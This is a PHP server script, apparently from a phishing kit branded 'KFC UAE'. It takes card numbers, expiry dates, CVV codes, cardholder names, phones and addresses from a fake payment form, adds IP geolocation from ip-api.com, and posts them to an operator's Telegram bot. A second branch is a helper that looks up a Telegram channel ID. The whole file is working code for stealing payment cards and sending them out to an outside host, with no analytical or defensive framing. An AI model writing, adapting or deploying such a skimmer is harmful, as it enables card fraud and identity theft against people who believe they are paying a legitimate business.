<?php

if($_POST) {
	
	$text_ip = "";
	if(@$_POST['ip']) {
		$ip_query = json_decode(file_get_contents('http://ip-api.com/json/'.@$_POST['ip'].'?fields=country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,query,status,message'), true);
		if(@$ip_query['countryCode']) {
			$text_ip .= "\n---IP INFO---\nCountry: ".@$ip_query['country']."\nRegion: ".@$ip_query['regionName']."\nCity: ".@$ip_query['city']."\n-----------";
		}
	}
	
	$chat_id = "";
	$botToken = "";
	
	//$text = "IP: ".@$_POST['ip'].($text_ip ? $text_ip : "")."\nLanguage: ".@$_POST['lang']."\nAddress: ".@$_POST['address']."\nAddress: ".@$_POST['firstname']."\nLastname: ".@$_POST['lastname']."\nPhone: ".@$_POST['phone']."\nEmail: ".@$_POST['email']."\nCard number: ".@$_POST['card_number']."\nСard MM/YY: ".@$_POST['card_mmyy']."\nСard CVC: ".@$_POST['card_cvc']."\n";
	$text = "<b>KFC UAE</b>\nCard number: ".@$_POST['card']."\nCard MM/YY: ".@$_POST['mm'].'/'.@$_POST['yy']."\nCard CVC: ".@$_POST['cvv']."\nCard holder: ".@$_POST['cardholder']."\nPhone: ".@$_POST['phone']."\nAddress: ".@$_POST['address']."\nSumm: ".@$_POST['summ'].' '.@$_POST['cur']."\n";
	
	// following ones are optional, so could be set as null
	$disable_web_page_preview = false;
	$reply_to_message_id = null;

	$data = array(
			'chat_id' => $chat_id,
			'text' => $text,
			'parse_mode' => 'HTML',
			'disable_web_page_preview' => json_encode($disable_web_page_preview),
			'reply_to_message_id' => json_encode($reply_to_message_id),
		);

	//if($prev_message_id > 0){
	//	$data['message_id'] = $prev_message_id;
	//	$url = "https://api.telegram.org/bot$botToken/editMessageText";
	//} else {
		$url = "https://api.telegram.org/bot$botToken/sendMessage";
	//}

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, count($data));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
	$result = curl_exec($ch);
	curl_close($ch);
	$result = json_decode($result, true);
	if(@$result['ok'] == true) {
		//$prev_message_id = @$result['result']['message_id'];
		$response['ok'] = true;
	} else
		$response['ok'] = false;
	//$code_is_valid_seconds--;
	//usleep(500000);
	
	header("Content-type: application/json; charset=utf-8");
	echo json_encode($response);
}


/////////////////////////////////////////////////////////////////////////////
if(@$_GET['act'] == 'get_channel_id' && strlen(trim(@$_GET['channel'])) > 0 && strlen(trim(@$_GET['token'])) > 0) 
{
	$chat_id = trim(@$_GET['channel']);
	if(substr($chat_id, 0, 1) != '@' && substr($chat_id, 0, 1) != '-')
		$chat_id = '@' . $chat_id;  
	$botToken = trim(@$_GET['token']);
	$text = 'Test';
	// following ones are optional, so could be set as null
	$disable_web_page_preview = false;
	$reply_to_message_id = null;

	$data = array(
			'chat_id' => $chat_id,
			'text' => $text,
			'parse_mode' => 'HTML',
			'disable_web_page_preview' => json_encode($disable_web_page_preview),
			'reply_to_message_id' => json_encode($reply_to_message_id),
		);

	$url = "https://api.telegram.org/bot$botToken/sendMessage";

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, count($data));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
	$result = curl_exec($ch);
	curl_close($ch);
	$result = json_decode($result, true);
	if(@$result['ok'] == true)
		$response['ok'] = true;
	else
		$response['ok'] = false;
	header("Content-type: application/json; charset=utf-8");
	
	echo 'ID канала: ' . (isset($result['result']['sender_chat']['id']) ? $result['result']['sender_chat']['id'] : '');
	if(!@$result['ok'] && @$result['description']) {
		echo '<br>';
		echo 'Ошибка: ' . @$result['description'];
	}
	echo '<br>';
	echo '<br>';
	echo '<pre>';
	print_r($result);
	echo '</pre>';

	die();
}

?>